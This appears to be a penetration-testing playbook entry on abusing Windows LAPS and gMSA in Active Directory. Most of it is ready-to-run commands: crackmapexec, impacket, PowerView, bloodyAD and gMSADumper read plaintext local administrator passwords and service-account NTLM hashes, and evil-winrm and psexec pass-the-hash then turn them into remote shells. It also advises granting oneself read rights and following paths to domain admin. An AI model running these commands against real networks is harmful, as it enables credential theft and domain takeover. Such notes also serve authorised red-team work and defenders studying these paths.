---
id: laps-abuse
title: LAPS & gMSA Abuse
stage: privesc
tags: [windows, ad]
tools:
  - crackmapexec smb $TARGET -u user -p pass -M laps
  - Get-ADComputer $TARGET -Properties ms-Mcs-AdmPwd
  - impacket-laps domain.local/user:pass -computer $TARGET -dc-ip $DC
leads_to: [system-shell, domain-admin]
summary: Read LAPS local admin passwords or gMSA service account passwords from Active Directory if you have the required permissions.
---

## What is LAPS

LAPS (Local Administrator Password Solution) randomises the local Administrator password on each domain-joined machine and stores it in AD attribute `ms-Mcs-AdmPwd`. Only specific AD groups (and SYSTEM) can read it. If your user or group has `AllExtendedRights` or `ReadProperty` on that attribute — you can retrieve the plaintext password.

## Check LAPS Presence

```bash
# Does the attribute exist on a target computer?
# From Linux
impacket-laps domain.local/user:password -computer TARGET_HOSTNAME -dc-ip $DC

# From Windows
Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd | Select ms-Mcs-AdmPwd
```

## Read LAPS Password with CME

```bash
crackmapexec smb $DC -u user -p password -M laps
# Lists all computers where your account can read the LAPS password
```

## PowerView — Who Can Read LAPS on a Machine

```powershell
# Find which groups/users can read ms-Mcs-AdmPwd
Find-AdmPwdExtendedRights -ComputerName $TARGET_COMPUTER
Get-AdmPwdPassword -ComputerName $TARGET_COMPUTER
```

## Enumerate All Readable LAPS Passwords

```powershell
# Get all computers that have LAPS enabled and password is readable
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | 
  Where-Object { $_.'ms-Mcs-AdmPwd' } | 
  Select Name, 'ms-Mcs-AdmPwd'
```

## gMSA (Group Managed Service Accounts)

gMSA passwords are stored in AD attribute `msDS-ManagedPassword`. Accounts/groups in `PrincipalsAllowedToRetrieveManagedPassword` can read it.

```bash
# From Linux — retrieve gMSA password
impacket-bloodyAD -d domain.local -u user -p password --host $DC \
  get object gMSA_ACCOUNT$ --attr msDS-ManagedPassword

# Or with gMSADumper
python3 gMSADumper.py -u user -p password -d domain.local -l $DC
# Outputs: account$:::NTLM_HASH
```

```powershell
# From Windows
$gmsa = Get-ADServiceAccount -Identity gMSA_ACCOUNT -Properties msDS-ManagedPassword
$mp = $gmsa.'msDS-ManagedPassword'
$blob = $mp | ConvertFrom-ADManagedPasswordBlob
$blob.CurrentPassword   # or extract NTLM from blob
```

## Use Retrieved Credentials

```bash
# LAPS password — authenticate as local Administrator
crackmapexec smb $TARGET -u Administrator -p 'LAPS_PASSWORD' --local-auth
evil-winrm -i $TARGET -u Administrator -p 'LAPS_PASSWORD'

# gMSA — Pass the Hash with retrieved NTLM
impacket-psexec domain.local/'gMSA_ACCOUNT$'@$TARGET -hashes :NTLM_HASH
```

## Notes

- LAPS only protects the built-in local Administrator (RID 500) — other local accounts are unaffected
- BloodHound marks `ReadLAPSPassword` and `ReadGMSAPassword` edges — check shortest path to DA
- If you can modify `PrincipalsAllowedToRetrieveManagedPassword` (WriteDACL/GenericAll), add yourself
- gMSA accounts often have high privileges (database service, backup, etc.) — retrieving the hash is frequently a DA path

